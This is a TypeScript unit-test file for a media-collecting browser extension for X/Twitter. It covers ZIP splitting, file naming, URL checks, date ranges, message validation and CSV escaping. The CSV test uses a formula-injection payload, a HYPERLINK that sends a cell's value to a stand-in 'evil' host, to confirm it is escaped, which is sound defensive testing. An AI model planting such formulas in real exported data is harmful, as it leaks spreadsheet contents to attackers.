import assert from 'node:assert/strict';
import test from 'node:test';
import { zipEntryName, zipPartDecision } from '../src/shared/zip-store.ts';
import { isCollectPageFor } from '../src/shared/validation.ts';
import { presetDayRange } from '../src/shared/media-query.ts';
import { isAllowedSender, OFFSCREEN_DOCUMENT_PATH, parseExtensionMessage } from '../src/shared/messages.ts';
import { csvCell } from '../src/shared/csv.ts';

// Mô phỏng vòng gom ZIP của offscreen.ts với một dãy kích thước file.
function packParts(sizes: number[], maxBytes: number, maxFiles: number) {
  const parts: number[][] = [];
  let current: number[] = [];
  let bytes = 0;
  let skipped = 0;
  for (const size of sizes) {
    const decision = zipPartDecision(bytes, current.length, size, maxBytes, maxFiles);
    if (decision === 'skip') { skipped++; continue; }
    if (decision === 'flush') { parts.push(current); current = []; bytes = 0; }
    current.push(size);
    bytes += size;
  }
  if (current.length) parts.push(current);
  return { parts, skipped };
}

test('L16: ZIP opens a new part at the byte limit instead of dropping the rest', () => {
  // Trước 8.2.3: tới file thứ 3 vượt 100 byte là dừng cả phần — 8 file bị bỏ.
  const { parts, skipped } = packParts([40, 40, 40, 40, 40, 40, 40, 40, 40, 40], 100, 50);
  assert.equal(skipped, 0);
  assert.equal(parts.flat().length, 10, 'every file lands in some part');
  assert.ok(parts.every((part) => part.reduce((a, b) => a + b, 0) <= 100));
});

test('L16: ZIP parts respect the file count and skip only files larger than a part', () => {
  const { parts, skipped } = packParts([10, 500, 10, 10, 10, 10], 100, 2);
  assert.equal(skipped, 1, 'a single file above the limit can never fit');
  assert.deepEqual(parts, [[10, 10], [10, 10], [10]]);
});

test('L18: ZIP entry names keep an extension and never collide', () => {
  const used = new Set<string>();
  assert.equal(zipEntryName('https://pbs.twimg.com/media/ABC?format=jpg&name=orig', 'jpg', 1, used), 'ABC.jpg');
  assert.equal(zipEntryName('https://pbs.twimg.com/media/ABC?format=jpg&name=small', 'jpg', 2, used), 'ABC_2.jpg');
  assert.equal(zipEntryName('https://pbs.twimg.com/media/XYZ?format=png&name=orig', 'jpg', 3, used), 'XYZ.png', 'format= wins over the default ext');
  assert.equal(zipEntryName('https://video.twimg.com/ext_tw_video/1/pu/vid/720x1280/clip.mp4?tag=12', 'mp4', 4, used), 'clip.mp4');
  assert.equal(zipEntryName('not a url', undefined, 5, used), 'media_5.bin');
});

test('L22: collect page check compares path segments, not substrings', () => {
  assert.equal(isCollectPageFor('https://x.com/mediapart', 'mediapart'), false, 'profile root is not the Media tab');
  assert.equal(isCollectPageFor('https://x.com/mediapart/media', 'mediapart'), true);
  assert.equal(isCollectPageFor('https://x.com/media/media', 'media'), true);
  assert.equal(isCollectPageFor('https://x.com/alice/media', 'bob'), false, 'other profile');
  assert.equal(isCollectPageFor('https://x.com/alice/likes', 'alice_likes'), true);
  assert.equal(isCollectPageFor('https://x.com/alice/status/1850000000000000001/likes', 'alice_likes'), false);
  assert.equal(isCollectPageFor('https://x.com/i/bookmarks', '_bookmarks_'), true);
});

test('U17: date presets use the local calendar day, not UTC', () => {
  const previous = process.env.TZ;
  process.env.TZ = 'Asia/Ho_Chi_Minh';
  try {
    // 23:30 UTC ngày 25 = 06:30 sáng ngày 26 ở UTC+7.
    const now = new Date('2026-11-25T23:30:00Z');
    assert.deepEqual(presetDayRange('7d', now), { from: '2026-11-19', to: '2026-11-26' });
    assert.deepEqual(presetDayRange('1y', now), { from: '2026-01-01', to: '2026-11-26' });
    assert.equal(presetDayRange('unknown', now), null);
  } finally {
    if (previous === undefined) delete process.env.TZ;
    else process.env.TZ = previous;
  }
});

test('L19: ZIP_DONE is accepted only from the offscreen document with known fields', () => {
  const origin = 'chrome-extension://abc/';
  assert.equal(isAllowedSender('ZIP_DONE', `${origin}${OFFSCREEN_DOCUMENT_PATH}`, origin), true);
  assert.equal(isAllowedSender('ZIP_DONE', `${origin}popup/popup.html`, origin), false);
  assert.equal(isAllowedSender('ZIP_DONE', 'https://x.com/alice', origin), false);
  assert.ok(parseExtensionMessage({ type: 'ZIP_DONE', payload: { archives: 2, files: 60, skipped: 1 } }));
  assert.equal(parseExtensionMessage({ type: 'ZIP_DONE', payload: { archives: 1, url: 'x' } }), null);
});

test('S12: CSV cells from other accounts cannot start a formula', () => {
  assert.equal(csvCell('=HYPERLINK("https://evil/?"&A1,"Click")'), '"\'=HYPERLINK(""https://evil/?""&A1,""Click"")"');
  assert.equal(csvCell('@SUM(1)'), '"\'@SUM(1)"');
  assert.equal(csvCell('Normal bio, with comma'), '"Normal bio, with comma"');
});
